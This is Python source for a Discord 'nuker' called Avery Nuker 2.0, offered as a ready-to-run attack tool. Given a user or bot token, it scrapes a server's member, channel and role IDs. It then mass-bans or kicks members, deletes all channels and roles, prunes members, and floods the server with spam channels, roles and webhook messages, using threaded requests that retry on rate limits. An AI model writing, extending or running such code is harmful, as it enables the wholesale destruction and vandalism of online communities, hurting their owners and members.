import threading
from discord import channel, webhook
import requests
import discord
import time
import json
import sys
import os

from discord.ext import commands
from pypresence import Presence
from pathlib import Path

os.system(f'cls & mode 85,20 & title Avery 2.0 - Config')

def save_stats(token: str = 'none', color: str = '\x1b[38;5;56m', pace: int = 0.1):
    stats = {
        'token': token,
        'color': color,
        'text-pace': pace
    }
    with open('config.json', 'w') as f:
        json.dump(stats, f)
    pass

def init_io():
    try:
        dir = os.getcwd()
        path = f'{dir}\scrape'
        os.mkdir(path)
    except:
        pass
    if not Path('config.json').is_file():
        with open('config.json', 'a') as f:
            f.write('')
            json.dump({
                'token': 'none',
                'color': '\x1b[38;5;56m',
                'text-pace': 0.1
            }, f)
    open('scrape/members.txt', 'w')
    open('scrape/channels.txt', 'w')
    open('scrape/roles.txt', 'w')

init_io()

def getToken():
    with open('config.json') as f:
        obj = json.load(f)
        f.close()
    return obj['token']

def getColor():
    with open('config.json') as f:
        obj = json.load(f)
        f.close()
    return obj['color']

def getTextPace():
    with open('config.json') as f:
        obj = json.load(f)
        f.close()
    return obj['text-pace']

def println(msg: str = '', delay: int = getTextPace()):
    for c in msg:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(delay)
    pass

clr = getColor()

println(f'{clr}> \033[37mWelcome to the Avery Nuker 2.0. Press any key to start {clr}>> \033[37m')
input()

token = ''
token_inputted = False
rich_presence = ''

println(f'{clr}> \033[37mLoad token from config.json file? Default: y {clr}>> \033[37m')
choice = input()

if choice == 'n' or choice == 'N':
    token = input(f'{clr}> \033[37mToken{clr}: \033[37m')
    token_inputted = True

try:
    if token_inputted == False:
        if getToken() != 'none':
            token = getToken()
        else:
            token = input(f'{clr}> \033[37mInvalid token! Token{clr}: \033[37m')
except:
    token = input(f'{clr}> \033[37mInvalid token! Token{clr}: \033[37m')

println(f'{clr}> \033[37mRich Presence ({clr}Y\033[37m/{clr}N\033[37m){clr}: \033[37m')
rich_presence = input()

save_stats(token=token, color=getColor(), pace=getTextPace())

os.system('cls')

def check_token():
    if requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': f'{token}'}).status_code == 200: return 'user'
    else: return 'bot'

def RichPresence():
    if rich_presence == 'y' or rich_presence == 'Y':
        try:
            RPC = Presence('816053514584195073')
            RPC.connect()
            RPC.update(details='Connected', large_image='averylarge2', small_image='avery', large_text='github.com/Exortions/Avery-V2', start=time.time())
        except:
            pass

rich_presence = RichPresence()
token_type = check_token()
intents = discord.Intents.all()
intents.members = True

if token_type == 'user':
    headers = {'Authorization': f'{token}'}
    client = commands.Bot(command_prefix='>', case_insensitive=False, self_bot=True)
elif token_type == 'bot':
    headers = {'Authorization': f'Bot {token}'}
    client = commands.Bot(command_prefix='>', case_insensitive=False, intents=intents)

client.remove_command('help')

def createwebhook(channel, name):
    try:
        json = { 'name': name, }
        r = requests.post(f'https://discord.com/api/v8/channels/{channel}/webhooks', headers=headers, json=json)

        id = r.json()['id']
        tk = r.json()['token']

        return f'https://discord.com/api/webhooks/{id}/{tk}'
    except:
        pass

def sendwebhook(webhook, amount, name, message):
    try:
        for i in range(amount):
            json = { 'username': name, 'content': message }
            requests.post(webhook, json=json)
    except:
        pass

class Avery:

    def __init__(self, color):
        self.color = color
        self.reset = '\033[37m'
    
    def say(self, msg: str, newLine: bool = False):
        if newLine == False:
            print(f'{self.color}[{self.reset}+{self.color}]{self.reset} {msg}{self.reset}')
        else:
            print(f'\n{self.color}[{self.reset}+{self.color}]{self.reset} {msg}{self.reset}')

    def retry_after(self, requst):
        time.sleep(requst.json()['retry_after'])

    def success(self, request):
        return request.status_code == 200 or request.status_code == 201 or request.status_code == 204

    def ask(self, question: str):
        return input(f'{self.color}>{self.reset} {question}{self.color}: {self.reset}')

    def getGuild(self):
        return self.ask('Guild ID')
    
    def BanMembers(self, guild, member):
        while True:
            r = requests.put(f'https://discord.com/api/v8/guilds/{guild}/bans/{member}', headers=headers)
            if 'retry_after' in r.text:
                self.retry_after(r)
            else:
                if self.success(r):
                    self.say(f'Banned{self.color}{member.strip()}')
                break
    
    def KickMembers(self, guild, member):
        while True:
            r = requests.delete(f'https://discord.com/api/v8/guilds/{guild}/members/{member}', headers=headers)
            if 'retry_after' in r.text:
                self.retry_after(r)
            else:
                if self.success(r):
                    self.say(f'Kicked{self.color} {member.strip()}')
                break

    def DeleteChannels(self, guild, channel):
        while True:
            r = requests.delete(f'https://discord.com/api/v8/channels/{channel}', headers=headers)
            if 'retry_after' in r.text:
                self.retry_after(r)
            else:
                if self.success(r):
                    self.say(f'Deleted Channel {self.color}{channel.strip()}')
                break
    
    def DeleteRoles(self, guild, role):
        while True:
            r = requests.delete(f'https://discord.com/api/v8/guilds/{guild}/roles/{role}', headers=headers)
            if 'retry_after' in r.text:
                self.retry_after(r)
            else:
                if self.success(r):
                    self.say(f'Deleted Role {self.color} {role.strip()}')
                break
    
    def SpamChannels(self, guild, name, amount, message, spam):
        while True:
            json = { 'name': name, 'type': 0 }
            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/channels', headers=headers, json=json)
            if 'retry_after' in r.text:
                self.retry_after(r)
            else:
                if self.success(r):
                    self.say(f'Created Channel{self.color} {name}')
                    if spam:
                        webhook = createwebhook(r.json()['id'], name)
                        threading.Thread(target=sendwebhook, args=(webhook, amount, name, message,)).start()
                break
    
    def SpamRoles(self, guild, name):
        while True:
            json = {'name': name}
            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/roles', headers=headers, json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if self.success(r):
                    self.say(f'Created Role{self.color} {name}')
                break
    
    async def Scrape(self):
        guild = self.ask('Guild ID')
        await client.wait_until_ready()
        guildOBJ = client.get_guild(int(guild))
        members = await guildOBJ.chunk()
        
        try:
            os.remove('scrape/members.txt')
            os.remove('scrape/channels.txt')
            os.remove('scrape/roles.txt')
        except:
            pass

        membercount = 0
        with open('scrape/members.txt', 'a') as m:
            for member in members:
                m.write(str(member.id) + '\n')
                membercount += 1
            self.say(f'Scraped {self.color}{membercount}{self.reset} Members')
            m.close()
        
        channelcount = 0
        with open('scrape/channels.txt', 'a') as c:
            for channel in guildOBJ.channels:
                c.write(str(channel.id) + '\n')
                channelcount += 1
            self.say(f'Scraped {self.color}{channelcount}{self.reset} Channels')
            c.close()
        
        rolecount = 0
        with open('scrape/roles.txt', 'a') as r:
            for role in guildOBJ.roles:
                r.write(str(role.id) + '\n')
                rolecount += 1
            self.say(f'Scraped {self.color}{channelcount}{self.reset} Roles')
            r.close()

    async def Nuke(self):
        guild = self.ask('Guild ID')
        channel_name = self.ask('Channel Names')
        channel_amount = self.ask('Channel Amount')
        channel_spam = self.ask(f'Spam Channels? ({self.color}Y{self.reset}/{self.color}N{self.reset})')
        channel_spam_amount = 0
        channel_spam_message = ''
        if channel_spam == 'Y' or channel_spam == 'y':
            channel_spam_amount = self.ask('Spam Amount')
            channel_spam_message = self.ask('Spam Message')
        role_name = self.ask('Role Names')
        role_amount = self.ask('Role Amount')
        print()

        members = open('scrape/members.txt')
        channels = open('scrape/channels.txt')
        roles = open('scrape/roles.txt')

        for member in members:
            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
        for channel in channels:
            threading.Thread(target=self.DeleteChannels, args=(guild, channel,)).start()
        for role in roles:
            threading.Thread(target=self.DeleteRoles, args=(guild, role,)).start()
        for i in range(int(channel_amount)):
            if channel_spam == 'Y' or channel_spam == 'y':
                threading.Thread(target=self.SpamChannels, args=(guild, channel_name, channel_spam_amount, channel_spam_message, True)).start()
            else:
                self.SpamChannels()
                threading.Thread(target=self.SpamChannels, args=(guild, channel_name, 0, '', False)).start()
        for i in range(int(role_amount)):
            threading.Thread(target=self.SpamRoles, args=(guild, role_name,)).start()
        
        members.close()
        channels.close()
        roles.close()
    
    async def Ban(self):
        guild = self.getGuild()
        print()
        members = open('scrape/members.txt')
        for member in members:
            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
    
    async def Kick(self):
        guild = self.getGuild()
        print()
        members = open('scrape/members.txt')
        for member in members:
            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
    
    async def Channels(self):
        guild = self.getGuild()
        print()
        channels = open('scrape/channels.txt')
        for channel in channels:
            threading.Thread(target=self.DeleteChannels, args=(guild, channel,)).start()
    
    async def Roles(self):
        guild = self.getGuild()
        print()
        roles = open('scrape/roles.txt')
        for role in roles:
            threading.Thread(target=self.DeleteRoles, args=(guild, role,)).start()
    
    async def ChannelSpam(self):
        guild = self.getGuild()
        name = self.ask('Channel Names')
        amount = self.ask('Amount')
        spam = self.ask(f'Spam channel ({self.color}Y{self.reset}/{self.color}N{self.reset})')
        spamamount = 0
        message = ''
        if spam == 'Y' or spam == 'y':
            spamamount = int(self.ask('Spam message amount'))
            message = self.ask('Spam message')
        print()
        for i in range(int(amount)):
            if spam == 'Y' or spam == 'y':
                threading.Thread(target=self.SpamChannels, args=(guild, name, spamamount, message, True)).start()
            else:
                threading.Thread(target=self.SpamChannels, args=(guild, name, 0, '', False)).start()

    async def RoleSpam(self):
        guild = self.getGuild()
        name = self.ask('Role Names')
        amount = self.ask('Amount')
        print()
        for i in range(int(amount)):
            threading.Thread(target=self.SpamRoles, args=(guild, name,)).start()
    
    async def PruneMembers(self):
        guild = self.getGuild()
        print()
        await guild.prune_members(days=1, compute_prune_count=False, roles=guild.roles)
    
    def Credits(self):
        os.system(f'cls & mode 85,20 & title Avery 2.0 - Credits')
        print(f'''
                          {self.color}╔═╗╦  ╦╔═╗╦═╗╦ ╦  ╔╗╔╦ ╦╦╔═╔═╗╦═╗
                          \033[90m╠═╣╚╗╔╝║╣ ╠╦╝╚╦╝  ║║║║ ║╠╩╗║╣ ╠╦╝
                          {self.color}╩ ╩ ╚╝ ╚═╝╩╚═ ╩   ╝╚╝╚═╝╩ ╩╚═╝╩╚═
                            {self.color}[{self.reset}Discord{self.color}]{self.reset} skeet#1000
                            {self.color}[{self.reset}Github{self.color}]{self.reset} skeqt
                            {self.color}[{self.reset}Discord{self.color}]{self.reset} Exortions#8077
                            {self.color}[{self.reset}Github{self.color}]{self.reset} Exortions
        {self.reset}''')
    
    async def ThemeChanger(self):
        save_stats(token=token, color=self.color, pace=getTextPace())
        os.system(f'cls & mode 85,20 & title Avery 2.0 - Themes')
        print(f'''
                          {self.color}╔═╗╦  ╦╔═╗╦═╗╦ ╦  ╔╗╔╦ ╦╦╔═╔═╗╦═╗
                          \033[90m╠═╣╚╗╔╝║╣ ╠╦╝╚╦╝  ║║║║ ║╠╩╗║╣ ╠╦╝
                          {self.reset}╩ ╩ ╚╝ ╚═╝╩╚═ ╩   ╝╚╝╚═╝╩ ╩╚═╝╩╚═
        {self.color}╔═══════════════════════╦═══════════════════════╦═══════════════════════╗{self.reset}
        {self.color}║ {self.reset}[{self.color}1{self.reset}] {self.reset}Red               {self.color}║{self.reset} [{self.color}5{self.reset}] {self.reset}Purple            {self.color}║{self.reset} [{self.color}9{self.reset}] {self.reset}Grey              {self.color}║{self.reset}
        {self.color}║ {self.reset}[{self.color}2{self.reset}] {self.reset}Green             {self.color}║{self.reset} [{self.color}6{self.reset}] {self.reset}Blue              {self.color}║{self.reset} [{self.color}0{self.reset}] {self.reset}Peach             {self.color}║{self.reset}
        {self.color}║ {self.reset}[{self.color}3{self.reset}] {self.reset}Yellow            {self.color}║{self.reset} [{self.color}7{self.reset}] {self.reset}Pink              {self.color}║{self.reset} [{self.color}M{self.reset}] {self.reset}Menu              {self.color}║{self.reset}
        {self.color}║ {self.reset}[{self.color}4{self.reset}] {self.reset}Orange            {self.color}║{self.reset} [{self.color}8{self.reset}] {self.reset}Cyan              {self.color}║{self.reset} [{self.color}X{self.reset}] {self.reset}Exit              {self.color}║{self.reset}
        {self.color}╚═══════════════════════╩═══════════════════════╩═══════════════════════╝{self.reset}
             
        {self.reset}''')
        choice = input(f'{self.color}> {self.reset}Choice{self.color}: {self.reset}')

        if choice == '1':
            self.color = '\x1b[38;5;196m'
            await self.ThemeChanger()
        elif choice == '2':
            self.color = '\x1b[38;5;34m'
            await self.ThemeChanger()
        elif choice == '3':
            self.color = '\x1b[38;5;142m'
            await self.ThemeChanger()
        elif choice == '4':
            self.color = '\x1b[38;5;172m'
            await self.ThemeChanger()
        elif choice == '5':
            self.color = '\x1b[38;5;56m'
            await self.ThemeChanger()
        elif choice == '6':
            self.color = '\x1b[38;5;21m'
            await self.ThemeChanger()
        elif choice == '7':
            self.color= '\x1b[38;5;201m'
            await self.ThemeChanger()
        elif choice == '8':
            self.color= '\x1b[38;5;51m'
            await self.ThemeChanger()
        elif choice == '9':
            self.color= '\x1b[38;5;103m'
            await self.ThemeChanger()
        elif choice == '0':
            self.color= '\x1b[38;5;209m'
            await self.ThemeChanger()
        elif choice == 'M' or choice == 'm':
            await self.Menu()
        elif choice == 'X' or choice == 'x':
            os._exit(0)


    async def Menu(self):
        os.system(f'cls & mode 85,20 & title Avery 2.0 - Connected: {client.user}')
        print(f'''
                            {self.color}╔═╗╦  ╦╔═╗╦═╗╦ ╦  ╔╗╔╦ ╦╦╔═╔═╗╦═╗
                            \033[90m╠═╣╚╗╔╝║╣ ╠╦╝╚╦╝  ║║║║ ║╠╩╗║╣ ╠╦╝
                            {self.reset}╩ ╩ ╚╝ ╚═╝╩╚═ ╩   ╝╚╝╚═╝╩ ╩╚═╝╩╚═
        {self.color}╔═══════════════════════╦═══════════════════════╦═══════════════════════╗{self.reset}
        {self.color}║ {self.reset}[{self.color}1{self.reset}] {self.reset}Ban Members       {self.color}║{self.reset} [{self.color}5{self.reset}] {self.reset}Delete Channels   {self.color}║{self.reset} [{self.color}9{self.reset}] {self.reset}Scrape Info       {self.color}║{self.reset}
        {self.color}║ {self.reset}[{self.color}2{self.reset}] {self.reset}Kick Members      {self.color}║{self.reset} [{self.color}6{self.reset}] {self.reset}Create Roles      {self.color}║{self.reset} [{self.color}0{self.reset}] {self.reset}Change Themes     {self.color}║{self.reset}
        {self.color}║ {self.reset}[{self.color}3{self.reset}] {self.reset}Prune Members     {self.color}║{self.reset} [{self.color}7{self.reset}] {self.reset}Create Channels   {self.color}║{self.reset} [{self.color}C{self.reset}] {self.reset}View Credits      {self.color}║{self.reset}
        {self.color}║ {self.reset}[{self.color}4{self.reset}] {self.reset}Delete Roles      {self.color}║{self.reset} [{self.color}8{self.reset}] {self.reset}Nuke Server       {self.color}║{self.reset} [{self.color}X{self.reset}] {self.reset}Exit              {self.color}║{self.reset}
        {self.color}╚═══════════════════════╩═══════════════════════╩═══════════════════════╝{self.reset}
                
        {self.reset}''')

        choice = input(f'{self.color}> {self.reset}Choice{self.color}: {self.reset}')
        if choice == '1':
            await self.Ban()
            time.sleep(2)
            await self.Menu()
        elif choice == '2':
            await self.Kick()
            time.sleep(2)
            await self.Menu()
        elif choice == '3':
            await self.PruneMembers()
            time.sleep(2)
            await self.Menu()
        elif choice == '4':
            await self.Roles()
            time.sleep(2)
            await self.Menu()
        elif choice == '5':
            await self.Channels()
            time.sleep(2)
            await self.Menu()
        elif choice == '6':
            await self.RoleSpam()
            time.sleep(2)
            await self.Menu()
        elif choice == '7':
            await self.ChannelSpam()
            time.sleep(2)
            await self.Menu()
        elif choice == '8':
            await self.Nuke()
            time.sleep(2)
            await self.Menu()
        elif choice == '9':
            await self.Scrape()
            time.sleep(3)
            await self.Menu()
        elif choice == '0':
            await self.ThemeChanger()
        elif choice == 'C' or choice == 'c':
            self.Credits()
            input()
            await self.Menu()
        elif choice == 'X' or choice == 'x':
            os._exit(0)

    @client.event
    async def on_ready():
        await Avery(getColor()).Menu()
            
    def Startup(self):
        try:
            if token_type == 'user':
                client.run(token, bot=False)
            elif token_type == 'bot':
                client.run(token)
            self.color = getColor()
            save_stats(token=token, color=self.color, pace=getTextPace())
        except:
            print(f'{self.color}>{self.reset} Invalid Token')
            input()
            os._exit(0)

if __name__ == '__main__':
    Avery(color=getColor()).Startup()